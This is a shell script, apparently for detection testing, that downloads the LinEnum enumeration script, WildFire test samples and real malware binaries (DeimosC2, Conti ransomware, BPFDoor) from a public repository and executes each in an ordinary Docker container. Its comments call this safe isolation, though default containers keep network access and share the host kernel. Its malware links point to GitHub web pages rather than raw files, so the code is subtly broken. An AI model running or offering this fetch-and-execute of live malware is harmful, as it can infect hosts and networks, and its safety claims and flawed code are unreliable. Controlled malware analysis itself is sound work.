#!/bin/sh
# Optimized Script to Run in a Containerized Environment
# The entire process runs inside a Docker container for enhanced security.

# Step 1: Set Up Environment Variables and Directories
WORK_DIR="/opt/containerized_testing"
DOWNLOAD_DIR="$WORK_DIR/downloads"

mkdir -p $DOWNLOAD_DIR

# Step 2: Download Enumeration Script using wget or curl
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $DOWNLOAD_DIR/enum_script.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl -o $DOWNLOAD_DIR/enum_script.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi

# Step 3: Verify Download Integrity (Optional but Recommended)
# Here you can add a SHA256 or MD5 verification step to ensure file integrity if hashes are known.

# Step 4: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod +x $DOWNLOAD_DIR/enum_script.sh

# Step 5: Run the Enumeration Script in a Docker Container
echo "[+] Running the enumeration script in a Docker container..."
docker run --rm -v $DOWNLOAD_DIR:/scripts debian sh /scripts/enum_script.sh

# Step 6: Download Sample Files from WildFire for Testing Purposes
echo "[+] Downloading WildFire test samples..."
for sample in pe apk macos elf; do
  if command -v wget >/dev/null 2>&1; then
    wget https://wildfire.paloaltonetworks.com/publicapi/test/${sample} -O $DOWNLOAD_DIR/${sample}_sample
  elif command -v curl >/dev/null 2>&1; then
    curl -o $DOWNLOAD_DIR/${sample}_sample https://wildfire.paloaltonetworks.com/publicapi/test/${sample}
  fi

  # Verify the integrity of downloaded samples (Optional)
  # Example: echo "expected_sha256_hash $DOWNLOAD_DIR/${sample}_sample" | sha256sum -c -
  # if [ $? -ne 0 ]; then
  #   echo "[-] File integrity check failed for ${sample}_sample. Exiting."
  #   exit 1
  # fi

done

# Step 7: Make the Downloaded Samples Executable
echo "[+] Making the downloaded samples executable..."
chmod +x $DOWNLOAD_DIR/*_sample

# Step 8: Execute Samples for Detection Testing in Docker Containers
echo "[+] Executing WildFire test samples in Docker containers for safety..."
for sample in $DOWNLOAD_DIR/*_sample; do
  echo "[+] Running $(basename $sample) in an isolated container..."
  docker run --rm -v $DOWNLOAD_DIR:/samples debian /samples/$(basename $sample)
done

# Step 9: Download and Manage Additional Payloads (for Educational Purposes)
# Ensure payloads are only used in a secure, isolated environment.
C2_AGENT_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64"
CONTI_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64"
BPFD_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64"

# Download payloads into DOWNLOAD_DIR
download_file() {
  url=$1
  dest=$2

  if command -v wget >/dev/null 2>&1; then
    wget "$url" -O "$dest"
  elif command -v curl >/dev/null 2>&1; then
    curl -o "$dest" "$url"
  else
    echo "[-] Neither wget nor curl is available. Exiting."
    exit 1
  fi
}

echo "[+] Downloading C2 and Ransomware samples..."
download_file $C2_AGENT_URL "$DOWNLOAD_DIR/DeimosC2.elf"
download_file $CONTI_URL "$DOWNLOAD_DIR/Conti.elf"
download_file $BPFD_URL "$DOWNLOAD_DIR/BPFDoor.elf"

# Step 10: Execute Payloads Safely in a Docker Container
for payload in "$DOWNLOAD_DIR"/*.elf; do
  echo "[+] Running $(basename $payload) in an isolated container..."
  docker run --rm -v $DOWNLOAD_DIR:/payloads debian /payloads/$(basename $payload)
done

# Step 11: Clean Up
# Remove all downloaded files to prevent unauthorized access or accidental execution
echo "[+] Cleaning up downloaded files..."
rm -rf $WORK_DIR

# Notes:
# 1. This script runs potentially dangerous binaries inside Docker containers to provide isolation from the host system.
# 2. Ensure the Docker daemon is appropriately configured and monitored to avoid abuse.
# 3. Always run this script in a secure, isolated environment, such as a dedicated testing machine.

exit 0
